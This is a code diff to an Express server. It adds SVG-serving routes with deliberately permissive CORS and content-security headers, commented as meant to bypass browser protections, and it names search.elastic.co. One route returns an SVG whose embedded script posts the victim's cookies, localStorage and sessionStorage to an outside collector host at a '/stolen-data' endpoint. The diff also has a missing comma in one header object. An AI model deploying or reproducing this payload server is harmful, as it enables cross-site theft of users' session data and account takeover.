@@ -188,11 +188,14 @@ app.get('/redirect.svg', (req, res) => {
   res.send(`redirecting..`);
 });
 
-
-app.get('/embed.svg', (req, res) => {
-  // Organize headers into a single object for readability
+app.get('/embed-svg.svg', (req, res) => {
+  // Headers for bypassing ORB
   const headers = {
-    'Content-Type': 'text/html',
+    'Content-Type': 'image/svg+xml', // Proper content type for SVG
+    'Access-Control-Allow-Origin': '*', // Enable cross-origin access
+    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+    'Access-Control-Allow-Headers': '*',
+    'X-Content-Type-Options': 'nosniff' // Prevent MIME sniffing
     'Content-Security-Policy': [
       "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:",
       "script-src * 'unsafe-inline' 'unsafe-eval' data: blob:",
@@ -205,7 +208,58 @@ app.get('/embed.svg', (req, res) => {
       "X-Frame-Options 'ALLOW-FROM https://search.elastic.co'",
       "form-action *",
       "base-uri *",
-      "sandbox allow-popups allow-scripts allow-popups-to-escape-sandbox allow-top-navigation allow-forms"
+      "sandbox allow-popups allow-scripts allow-popups-to-escape-sandbox allow-top-navigation allow-forms",
+    ].join('; ')
+  };
+
+  res.set(headers);
+
+  // Return SVG embedding malicious HTML or JS via <foreignObject>
+  res.status(200).send(`
+    <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+        <foreignObject width="100" height="100">
+            <body xmlns="http://www.w3.org/1999/xhtml">
+                <script>
+                    // Example: Stealing cookies or sessionStorage
+                    fetch('https://kani-collaborator.onrender.com/stolen-data', {
+                        method: 'POST',
+                        body: JSON.stringify({
+                            cookies: document.cookie,
+                            localStorage: JSON.stringify(localStorage),
+                            sessionStorage: JSON.stringify(sessionStorage)
+                        }),
+                        headers: { 'Content-Type': 'application/json' }
+                    });
+                </script>
+                <h1>Malicious Code Executing...</h1>
+            </body>
+        </foreignObject>
+    </svg>
+  `);
+});
+
+
+app.get('/embed-any.svg', (req, res) => {
+  // Organize headers into a single object for readability
+  const headers = {
+    'Content-Type': 'image/svg+xml',
+    'X-Content-Type-Options': 'nosniff',
+    'Access-Control-Allow-Origin': '*',
+    'Access-Control-Allow-Headers': '*',
+    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS, PUT',
+    'Content-Security-Policy': [
+      "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:",
+      "script-src * 'unsafe-inline' 'unsafe-eval' data: blob:",
+      "style-src * 'unsafe-inline' data:",
+      "img-src * data: blob:",
+      "object-src *",
+      "connect-src *",
+      "frame-src *",
+      "frame-ancestors *",
+      "X-Frame-Options 'ALLOW-FROM https://search.elastic.co'",
+      "form-action *",
+      "base-uri *",
+      "sandbox allow-popups allow-scripts allow-popups-to-escape-sandbox allow-top-navigation allow-forms",
     ].join('; ')
   };
 
